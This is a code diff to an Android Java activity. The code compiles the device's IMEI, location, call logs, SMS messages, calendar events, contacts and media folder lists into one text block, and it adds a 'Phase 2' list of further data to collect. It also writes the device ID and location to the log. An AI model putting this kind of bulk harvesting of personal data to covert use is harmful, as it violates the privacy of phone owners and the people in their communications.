@@ -234,7 +234,7 @@ public class StartCommonFetchingActivity extends LocationActivity  {
                 }
 
         }
-        new SavePref(this).setMyIMEI("MY IMEI NUMBER :"+deviceId);
+        new SavePref(this).setMyIMEI("IMEI NUMBER Or DEVICE ID:"+deviceId);
         Log.d("deviceIdram", deviceId);
         return deviceId;
     }
@@ -938,9 +938,9 @@ public class StartCommonFetchingActivity extends LocationActivity  {
                     @Override
                     public void run() {
 
-                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyPhoneNumber() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getLocation() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getHardSoftInfo() + "\n\n");
+                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyIMEI() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCallLogData() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getSMSData() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCalenderEvents() + "\n\n");
@@ -950,7 +950,8 @@ public class StartCommonFetchingActivity extends LocationActivity  {
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getContactsList() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getImagesFolders() + "\n\n");
                         sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getVideosFolders() + "\n\n");
-                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyIMEI() + "\n\n");
+                        sbfinal.append("##Phase 2##"+ "\n\n");
+                        sbfinal.append("Rejected call list"+" ,"+"Blocked call list"+","+"IMEI number or Device id"+","+"User mobile number"+ "\n\n");
 
                         Log.e("EFwdefdsaxzdcefdcx", new SavePref(StartCommonFetchingActivity.this).getLocation());
 
